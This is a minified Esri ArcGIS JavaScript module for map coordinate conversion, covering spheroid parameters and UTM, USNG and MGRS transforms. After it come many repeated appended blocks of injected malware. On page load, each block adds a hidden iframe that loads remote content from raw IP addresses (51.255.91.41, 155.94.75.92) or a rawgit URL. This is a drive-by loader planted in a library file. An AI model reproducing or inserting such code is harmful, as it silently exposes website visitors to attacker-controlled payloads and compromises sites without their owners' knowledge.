// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["esri/geometry/Point"],function(n){var d,b,m;d=6378137;b=.00669437999;m=b/(1-b);var l=(1-Math.sqrt(1-b))/(1+Math.sqrt(1-b));return{setSpheroid:function(a){a=a.toUpperCase();switch(a){case "AIRY 1830":d=6377563.396;b=.00667053999998536;break;case "AIRY MODIFIED":d=6377340.189;b=.00667053999998536;break;case "AVERAGE TERRESTRIAL SYSTEM 1977":d=6378135;b=.00669438499958795;break;case "AUSTRALIAN NATIONAL":d=6378160;b=.00669454185458764;break;case "BESSEL 1841":d=6377397.155;b=.00667437223180214;
break;case "BESSEL MODIFIED":d=6377492.018;b=.00667437223180214;break;case "BESSEL NAMIBIA":d=6377483.865;b=.00667437223180214;break;case "CLARKE 1858":d=6378293.639;b=.00678514600473303;break;case "NAD27":case "CLARKE 1866":d=6378206.4;b=.00676865799760964;break;case "CLARKE 1866 MICHIGAN":d=6378450.047;b=.00676865830738507;break;case "CLARKE 1880":d=6378249.138;b=.00680348101883452;break;case "CLARKE 1880 (ARC)":d=6378249.145;b=.00680348101883452;break;case "CLARKE 1880 (BENOIT)":d=6378300.79;b=
.00680348271028565;break;case "CLARKE 1880 (IGN)":d=6378249.2;b=.00680348767623919;break;case "CLARKE 1880 (RGS)":d=6378249.145;b=.00680351128284906;break;case "CLARKE 1880 (SGA)":d=6378249.2;b=.00680348860198551;break;case "EVEREST 1830 (DEFINITION)":d=6377299.36;b=.00663784663019969;break;case "EVEREST 1830 (MODIFIED)":d=6377304.063;b=.00663784663019969;break;case "EVEREST (ADJUSTMENT 1937)":d=6377276.345;b=.00663784663019969;break;case "EVEREST (DEFINITION 1962)":d=6377301.243;b=.00663784606842344;
break;case "EVEREST (DEFINITION 1967)":d=6377298.556;b=.00663784663019969;break;case "EVEREST (DEFINITION 1975)":d=6377299.151;b=.00663784606842344;break;case "NAD83":case "GEM GRAVITY POTENTIAL MODEL":case "GRS 1980":d=6378137;b=.00669438002290079;break;case "GRS 1967 \x3d INTERNATIONAL 1967":d=6378160;b=.00669460532856765;break;case "HELMERT 1906":d=6378200;b=.00669342162296594;break;case "INDONESIAN NATIONAL":d=6378160;b=.0066946090804091;break;case "INTERNATIONAL 1924":d=6378388;b=.00672267002233332;
break;case "INTERNATIONAL 1967":d=6378160;b=.00669454185458764;break;case "KRASOVSKY 1940":d=6378245;b=.00669342162296594;break;case "TRANSIT PRECISE EPHEMERIS":d=6378145;b=.00669454185458764;break;case "OSU 1986 GEOIDAL MODEL":d=6378136.2;b=.00669438006997852;break;case "OSU 1991 GEOIDAL MODEL":d=6378136.3;b=.00669438006997852;break;case "PLESSIS 1817":d=6376523;b=.00646954373789485;break;case "STRUVE 1860":d=6378298.3;b=.00677435980080942;break;case "WAR OFFICE":d=6378300.583;b=.00674534331628926;
break;case "NWL-10D \x3d\x3d WGS 1972":d=6378135;b=.00669431777826672;break;case "WGS 1972":d=6378135;b=.00669431777826672;break;case "WGS84":case "WGS 1984":d=6378137;b=.00669437999014132;break;case "WGS 1966":d=6378145;b=.00669454185458764;break;case "FISCHER 1960":d=6378166;b=.00669342162296594;break;case "FISCHER 1968":d=6378150;b=.00669342162296594;break;case "FISCHER MODIFIED":d=6378155;b=.00669342162296594;break;case "HOUGH 1960":d=6378270;b=.00672267002233332;break;case "EVEREST MODIFIED 1969":d=
6377295.664;b=.00663784663019969;break;case "WALBECK":d=6376896;b=.00659454809414964;break;case "GRS 1967 TRUNCATED":d=6378160,b=.00669454185458764}m=b/(1-b);l=(1-Math.sqrt(1-b))/(1+Math.sqrt(1-b))},getSpheroidList:function(){return"AIRY 1830;AIRY MODIFIED;AUSTRALIAN NATIONAL;AVERAGE TERRESTRIAL SYSTEM 1977;BESSEL 1841;BESSEL MODIFIED;BESSEL NAMIBIA;CLARKE 1858;CLARKE 1866 MICHIGAN;CLARKE 1866;CLARKE 1880 (ARC);CLARKE 1880 (BENOIT);CLARKE 1880 (IGN);CLARKE 1880 (RGS);CLARKE 1880 (SGA);CLARKE 1880;EVEREST (ADJUSTMENT 1937);EVEREST (DEFINITION 1962);EVEREST (DEFINITION 1967);EVEREST (DEFINITION 1975);EVEREST 1830 (DEFINITION);EVEREST 1830 (MODIFIED);EVEREST MODIFIED 1969;FISCHER 1960;FISCHER 1968;FISCHER MODIFIED;GEM GRAVITY POTENTIAL MODEL;GRS 1967 \x3d INTERNATIONAL 1967;GRS 1967 TRUNCATED;GRS 1980;HELMERT 1906;HOUGH 1960;INDONESIAN NATIONAL;INTERNATIONAL 1924;INTERNATIONAL 1967;KRASOVSKY 1940;NWL-10D \x3d\x3d WGS 1972;OSU 1986 GEOIDAL MODEL;OSU 1991 GEOIDAL MODEL;PLESSIS 1817;STRUVE 1860;TRANSIT PRECISE EPHEMERIS;WALBECK;WAR OFFICE;WGS 1966;WGS 1972;WGS 1984".split(";")},
getZoneNumber:function(a,c){a=parseFloat(a);c=parseFloat(c);if(360<c||-180>c){for(;-180>c;)c+=360;for(;180<c;)c-=360}(360<c||-180>c||90<a||-90>a)&&console.error("Bad input. lat: "+a+" lon: "+c);c=c+180-360*Math.floor((c+180)/360)-180;var b=Math.floor((c+180)/6)+1;56<=a&&64>a&&3<=c&&12>c&&(b=32);72<=a&&84>a&&(0<=c&&9>c?b=31:9<=c&&21>c?b=33:21<=c&&33>c?b=35:33<=c&&42>c&&(b=37));return b},LLtoUTM:function(a,c,k){a=parseFloat(a);c=parseFloat(c);if(84<a||-80>a)return"undefined, ensure 84N \x3e Lat \x3e 80S";
if(360<c||-180>c){for(;-180>c;)c+=360;for(;180<c;)c-=360}(360<c||-180>c||90<a||-90>a)&&console.error("Bad input. lat: "+a+" lon: "+c);var e,g,h,f;e=c+180-360*Math.floor((c+180)/360)-180;g=a*Math.PI/180;e=e*Math.PI/180;c=k?k:this.getZoneNumber(a,c);k=(6*(c-1)-180+3)*Math.PI/180;this.UTMLetterDesignator(a);a=d/Math.sqrt(1-b*Math.sin(g)*Math.sin(g));h=Math.tan(g)*Math.tan(g);f=m*Math.cos(g)*Math.cos(g);e=Math.cos(g)*(e-k);return[.9996*a*(e+(1-h+f)*e*e*e/6+(5-18*h+h*h+72*f-58*m)*e*e*e*e*e/120)+5E5,.9996*
(d*((1-b/4-3*b*b/64-5*b*b*b/256)*g-(3*b/8+3*b*b/32+45*b*b*b/1024)*Math.sin(2*g)+(15*b*b/256+45*b*b*b/1024)*Math.sin(4*g)-35*b*b*b/3072*Math.sin(6*g))+a*Math.tan(g)*(e*e/2+(5-h+9*f+4*f*f)*e*e*e*e/24+(61-58*h+h*h+600*f-330*m)*e*e*e*e*e*e/720)),c]},LLtoUSNG:function(a,c,b,e){b=b||5;var d;d=e?e:this.getZoneNumber(a,c);a=parseFloat(a);c=parseFloat(c);var k=this.LLtoUTM(a,c,d);e=k[0];var f=k[1];0>a&&(f+=1E7);k=this.findGridLetters(d,f,e);d=Math.round(f)%1E5;e=Math.round(e)%1E5;d=Math.floor(d/Math.pow(10,
5-b));e=Math.floor(e/Math.pow(10,5-b));a=this.getZoneNumber(a,c)+this.UTMLetterDesignator(a)+" "+k+" ";for(c=String(e).length;c<b;c++)a+="0";a+=e+" ";for(c=String(d).length;c<b;c++)a+="0";return a+d},UTMLetterDesignator:function(a){a=parseFloat(a);return 84>=a&&72<=a?"X":72>a&&64<=a?"W":64>a&&56<=a?"V":56>a&&48<=a?"U":48>a&&40<=a?"T":40>a&&32<=a?"S":32>a&&24<=a?"R":24>a&&16<=a?"Q":16>a&&8<=a?"P":8>a&&0<=a?"N":0>a&&-8<=a?"M":-8>a&&-16<=a?"L":-16>a&&-24<=a?"K":-24>a&&-32<=a?"J":-32>a&&-40<=a?"H":-40>
a&&-48<=a?"G":-48>a&&-56<=a?"F":-56>a&&-64<=a?"E":-64>a&&-72<=a?"D":-72>a&&-80<=a?"C":"Z"},findSet:function(a){a=parseInt(a,10);switch(a%6){case 0:return 6;case 1:return 1;case 2:return 2;case 3:return 3;case 4:return 4;case 5:return 5;default:return-1}},findGridLetters:function(a,c,b){a=parseInt(a,10);c=parseFloat(c);b=parseFloat(b);var d=1;for(c=Math.round(c);1E5<=c;)c-=1E5,d++;d%=20;c=0;for(b=Math.round(b);1E5<=b;)b-=1E5,c++;c%=8;return this.lettersHelper(this.findSet(a),d,c)},lettersHelper:function(a,
c,b){0===c?c=19:c--;0===b?b=7:b--;switch(a){case 1:return a="ABCDEFGHJKLMNPQRSTUV","ABCDEFGH".charAt(b)+a.charAt(c);case 2:return a="FGHJKLMNPQRSTUVABCDE","JKLMNPQR".charAt(b)+a.charAt(c);case 3:return a="ABCDEFGHJKLMNPQRSTUV","STUVWXYZ".charAt(b)+a.charAt(c);case 4:return a="FGHJKLMNPQRSTUVABCDE","ABCDEFGH".charAt(b)+a.charAt(c);case 5:return a="ABCDEFGHJKLMNPQRSTUV","JKLMNPQR".charAt(b)+a.charAt(c);case 6:return a="FGHJKLMNPQRSTUVABCDE","STUVWXYZ".charAt(b)+a.charAt(c)}},UTMtoLL:function(a,c,k){c=
parseFloat(c)-5E5;a=parseFloat(a);k=parseInt(k,10);a=a/.9996/(d*(1-b/4-3*b*b/64-5*b*b*b/256));a=a+(3*l/2-27*l*l*l/32)*Math.sin(2*a)+(21*l*l/16-55*l*l*l*l/32)*Math.sin(4*a)+151*l*l*l/96*Math.sin(6*a);var e=d/Math.sqrt(1-b*Math.sin(a)*Math.sin(a)),g=Math.tan(a)*Math.tan(a),h=m*Math.cos(a)*Math.cos(a),f=c/(.9996*e);c=a-e*Math.tan(a)/(d*(1-b)/Math.pow(1-b*Math.sin(a)*Math.sin(a),1.5))*(f*f/2-(5+3*g+10*h-4*h*h-9*m)*f*f*f*f/24+(61+90*g+298*h+45*g*g-252*m-3*h*h)*f*f*f*f*f*f/720);c=180*c/Math.PI;a=(f-(1+
2*g+h)*f*f*f/6+(5-2*h+28*g-3*h*h+8*m+24*g*g)*f*f*f*f*f/120)/Math.cos(a);a=6*(k-1)-180+3+180*a/Math.PI;k={};k.lat=c;k.lon=a;return k},USNGtoUTM:function(a,c,b,d,g,h){b=1+"ABCDEFGHJKLMNPQRSTUVWXYZ".indexOf(b)%8;var e="CDEFGHJKLMNPQRSTUVWX".indexOf(c);d=a%2?"ABCDEFGHJKLMNPQRSTUV".indexOf(d):"FGHJKLMNPQRSTUVABCDE".indexOf(d);d=Number([0,2,2,2,4,4,6,6,8,8,0,0,0,2,2,4,4,6,6,6][e])+d/10;d<[1.1,2,2.9,3.8,4.7,5.6,6.5,7.3,8.2,9.1,0,.8,1.7,2.6,3.5,4.4,5.3,6.2,7,7.9][e]&&(d+=2);e={};e.N=1E6*d+Number(h)*Math.pow(10,
5-h.length);e.E=1E5*b+Number(g)*Math.pow(10,5-g.length);e.zone=a;e.letter=c;return e},USNGtoLL:function(a){a=this.parseUSNG_str(a);var c=this.USNGtoUTM(a.zone,a.ltr,a.sq1,a.sq2,a.east,a.north);"N">a.ltr&&(c.N-=1E7);c=this.UTMtoLL(c.N,c.E,a.zone);return[c.lat,c.lon]},parseUSNG_str:function(a){var c=[];a=a.toUpperCase();c=/%20/g;c=a.replace(c,"");c=/ /g;c=a.replace(c,"");if(7>c.length)return 0;a={};var b=0;a.zone=10*c.charAt(b++)+1*c.charAt(b++);a.ltr=c.charAt(b++);a.sq1=c.charAt(b++);a.sq2=c.charAt(b++);
a.precision=(c.length-b)/2;a.east="";a.north="";for(var d=0;d<a.precision;d++)a.east+=c.charAt(b++);" "===c[b]&&b++;for(d=0;d<a.precision;d++)a.north+=c.charAt(b++);return a},isUSNG:function(a){var b;a=a.toUpperCase();b=/%20/g;a=a.replace(b,"");b=/ /g;a=a.replace(b,"");if(15<a.length)return 0;b=/^[0-9]{2}[CDEFGHJKLMNPQRSTUVWX]$/;if(a.match(b))return 0;b=/^[0-9]{2}[CDEFGHJKLMNPQRSTUVWX][ABCDEFGHJKLMNPQRSTUVWXYZ][ABCDEFGHJKLMNPQRSTUV]([0-9][0-9]){0,5}/;return!a.match(b)||7>a.length?0:a},LLtoMGRS:function(a,
b,d){return this.LLtoUSNG(a,b,d||5).replace(/ /g,"")},USNGtoPoint:function(a){a=this.USNGtoLL(a);return new n(a[1],a[0])},pointToUSNG:function(a,b){var c=a.getLatitude();a=a.getLongitude();return this.LLtoUSNG(c,a,b)},LLtoUSNG_nad27:function(a,b,d){return this.LLtoUSNG(a,b,d||5)+" (NAD27)"}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});